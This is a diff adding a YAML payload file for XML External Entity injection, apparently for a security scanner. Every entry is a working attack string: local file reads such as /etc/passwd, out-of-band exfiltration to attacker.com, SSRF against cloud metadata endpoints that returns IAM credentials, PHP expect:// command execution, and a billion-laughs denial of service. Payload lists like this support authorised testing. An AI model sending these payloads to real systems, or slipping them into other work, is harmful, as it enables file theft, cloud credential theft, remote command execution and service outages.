@@ -1,0 +1,141 @@
+name: "XXE Payloads"
+description: "XML External Entity injection payloads"
+attack_type: "xxe"
+category: "general"
+
+payloads:
+  # Classic XXE - File retrieval
+  - value: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
+    description: "Classic XXE file read"
+    tags: ["classic", "file-read", "unix"]
+
+  - value: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><foo>&xxe;</foo>"
+    description: "Read hostname"
+    tags: ["classic", "file-read", "unix"]
+
+  - value: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>"
+    description: "Windows file read"
+    tags: ["classic", "file-read", "windows"]
+
+  - value: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/boot.ini\">]><foo>&xxe;</foo>"
+    description: "Windows boot.ini"
+    tags: ["classic", "file-read", "windows"]
+
+  # Parameter entity XXE
+  - value: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\">%xxe;]><foo>test</foo>"
+    description: "Parameter entity file read"
+    tags: ["parameter-entity", "file-read"]
+
+  - value: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>\">%eval;%exfil;]><foo>test</foo>"
+    description: "Parameter entity OOB"
+    tags: ["parameter-entity", "oob"]
+
+  # Blind XXE with OOB exfiltration
+  - value: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/xxe.dtd\">%xxe;]><foo>test</foo>"
+    description: "External DTD reference"
+    tags: ["blind", "oob", "dtd"]
+
+  - value: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/\">]><foo>&xxe;</foo>"
+    description: "HTTP request OOB"
+    tags: ["blind", "oob", "http"]
+
+  - value: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"https://attacker.com/\">]><foo>&xxe;</foo>"
+    description: "HTTPS OOB"
+    tags: ["blind", "oob", "https"]
+
+  # FTP-based OOB
+  - value: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"ftp://attacker.com/\">]><foo>&xxe;</foo>"
+    description: "FTP OOB"
+    tags: ["blind", "oob", "ftp"]
+
+  # DNS-based OOB
+  - value: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://xxe.attacker.com/\">]><foo>&xxe;</foo>"
+    description: "DNS-based detection"
+    tags: ["blind", "oob", "dns"]
+
+  # SSRF via XXE
+  - value: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>"
+    description: "AWS metadata SSRF"
+    tags: ["ssrf", "aws", "cloud"]
+
+  - value: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\">]><foo>&xxe;</foo>"
+    description: "AWS IAM credentials"
+    tags: ["ssrf", "aws", "cloud"]
+
+  - value: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://metadata.google.internal/computeMetadata/v1/\">]><foo>&xxe;</foo>"
+    description: "GCP metadata SSRF"
+    tags: ["ssrf", "gcp", "cloud"]
+
+  - value: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1:22\">]><foo>&xxe;</foo>"
+    description: "Port scan localhost"
+    tags: ["ssrf", "portscan"]
+
+  - value: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://localhost:8080/\">]><foo>&xxe;</foo>"
+    description: "Internal service probe"
+    tags: ["ssrf", "internal"]
+
+  # Error-based XXE
+  - value: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % error \"<!ENTITY &#x25; test SYSTEM 'file:///nonexistent/%file;'>\">%error;%test;]><foo>test</foo>"
+    description: "Error-based file exfil"
+    tags: ["error-based", "file-read"]
+
+  # PHP-specific XXE
+  - value: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><foo>&xxe;</foo>"
+    description: "PHP filter base64"
+    tags: ["php", "file-read", "filter"]
+
+  - value: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=index.php\">]><foo>&xxe;</foo>"
+    description: "PHP source code read"
+    tags: ["php", "file-read", "source"]
+
+  - value: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>"
+    description: "PHP expect RCE"
+    tags: ["php", "rce", "expect"]
+
+  # Java-specific XXE
+  - value: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"jar:file:///tmp/evil.jar!/evil.txt\">]><foo>&xxe;</foo>"
+    description: "Java JAR protocol"
+    tags: ["java", "jar"]
+
+  - value: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"netdoc:///etc/passwd\">]><foo>&xxe;</foo>"
+    description: "Java netdoc protocol"
+    tags: ["java", "netdoc"]
+
+  # .NET-specific XXE
+  - value: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file://attacker.com/share/xxe.txt\">]><foo>&xxe;</foo>"
+    description: ".NET UNC path"
+    tags: ["dotnet", "unc", "smb"]
+
+  # Encoded XXE
+  - value: "&#60;&#63;xml version=\"1.0\"&#63;&#62;&#60;&#33;DOCTYPE foo &#91;&#60;&#33;ENTITY xxe SYSTEM \"file:///etc/passwd\"&#62;&#93;&#62;&#60;foo&#62;&#38;xxe;&#60;/foo&#62;"
+    description: "HTML entity encoded"
+    tags: ["encoded", "html-entity"]
+
+  # SVG XXE
+  - value: "<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>&xxe;</text></svg>"
+    description: "SVG XXE"
+    tags: ["svg", "file-read"]
+
+  # SOAP XXE
+  - value: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope\"><soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>"
+    description: "SOAP XXE"
+    tags: ["soap", "file-read"]
+
+  # Excel/Office XXE (XLSX)
+  - value: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><t>&xxe;</t>"
+    description: "Office XML XXE"
+    tags: ["office", "xlsx", "file-read"]
+
+  # Billion laughs DoS (use carefully)
+  - value: "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\"><!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">]><lolz>&lol3;</lolz>"
+    description: "Billion laughs (limited)"
+    tags: ["dos", "entity-expansion"]
+
+  # XInclude
+  - value: "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>"
+    description: "XInclude file read"
+    tags: ["xinclude", "file-read"]
+
+  - value: "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"http://attacker.com/xxe\"/></foo>"
+    description: "XInclude OOB"
+    tags: ["xinclude", "oob"]
